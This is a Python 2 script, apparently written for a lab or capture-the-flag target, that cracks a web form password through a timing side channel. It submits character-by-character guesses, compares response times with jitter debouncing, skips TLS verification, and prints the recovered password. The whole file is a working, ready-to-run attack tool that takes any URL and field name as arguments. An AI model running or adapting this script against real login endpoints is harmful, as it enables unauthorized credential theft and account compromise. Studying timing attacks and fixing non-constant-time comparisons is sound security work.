#!/usr/bin/env python2

import sys
import requests
import operator
from requests.packages.urllib3.exceptions import InsecureRequestWarning


# ignore warning about self-signed cert
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# characters to attempt in password
CHARSET = "abcdefghijklmnopqrstuvwxyzHL4"
# any character not in above CHARSET
INVALID_CHAR = '`'


# make a single guess and return the time it took to make
def make_guess(guess):
    payload = {field: guess}
    r = requests.post(url, data=payload, verify=False)

    print r.elapsed, guess

    return r.elapsed


# make one round of guesses, and return results sorted by decreasing time
def get_sorted_guesses(known):
    guesses = {}

    for this_char in CHARSET:
        # guess must have an invalid trailing character so that we get an indication when this_char is correct
        guess = known + this_char + INVALID_CHAR

        guesses[guess] = make_guess(guess)

    return sorted(guesses.items(), key=operator.itemgetter(1), reverse=True)


def crack_password(url, field):
    known = ""
    last_best_guess_char = None

    #
    # first round.
    # measure how long it takes to compare a single character.
    #

    while True:
        sorted_guesses = get_sorted_guesses(known)

        # our best guess is the first entry in the list
        best_guess = sorted_guesses[0]
        best_guess_char = best_guess[0][-2]
        best_guess_time = best_guess[1]
        print "           best_guess_time =", best_guess_time

        # get the average time for all other entries in the list
        rest_guesses = sorted_guesses[1:]
        rest_guesses_times = [rest_guess[1] for rest_guess in rest_guesses]
        average_rest_guesses_times = reduce(operator.add, rest_guesses_times) / len(rest_guesses_times)
        print "average_rest_guesses_times =", average_rest_guesses_times

        # calculate average time to compare a single character
        slope = best_guess_time - average_rest_guesses_times
        print "                     slope =", slope

        # debounce (helpful with jitter caused by comms)
        if best_guess_char != last_best_guess_char:
            # need to see same result again
            last_best_guess_char = best_guess_char
        else:
            # we've seen the same result twice in a row.  must be good.
            known += best_guess_char
            last_best_guess_char = None
            break

    #
    # subsequent rounds.
    # cycle until we show no improvement in comparison time.
    #

    while True:
        sorted_guesses = get_sorted_guesses(known)

        # our best guess is the first entry in the list
        best_guess = sorted_guesses[0]
        best_guess_char = best_guess[0][-2]
        best_guess_time = best_guess[1]
        print "     best_guess =", best_guess_char, "@", best_guess_time

        # compare to next best guess
        next_best_guess = sorted_guesses[1]
        next_best_guess_char = next_best_guess[0][-2]
        next_best_guess_time = next_best_guess[1]
        print "next_best_guess =", next_best_guess_char, "@", next_best_guess_time

        # calculate time delta between best and next best
        time_delta = (best_guess_time - next_best_guess_time).total_seconds()
        print "               time_delta =", time_delta

        # is the gap significant?
        if time_delta < 0.5 * slope.total_seconds():
            # gap is insignificant.  replace finding with an invalid character.
            best_guess_char = INVALID_CHAR

        # debounce (helpful with jitter caused by comms)
        if best_guess_char != last_best_guess_char:
            # need to see same result again
            last_best_guess_char = best_guess_char
        else:
            # we've seen the same result twice in a row.  must be good.
            if best_guess_char != INVALID_CHAR:
                known += best_guess_char
                last_best_guess_char = None
            else:
                # we've seen the invalid character twice in a row.
                # most likely, this means we've guesses the full password.
                break

    print "Password =", known


if __name__ == '__main__':
    # default URL to submit to
    url = 'https://localhost:5003/'
    # default name of form field containing the password we want to guess
    field = 'password'

    if len(sys.argv) >= 2:
        url = sys.argv[1]
    if len(sys.argv) >= 3:
        field = sys.argv[2]

    crack_password(url, field)
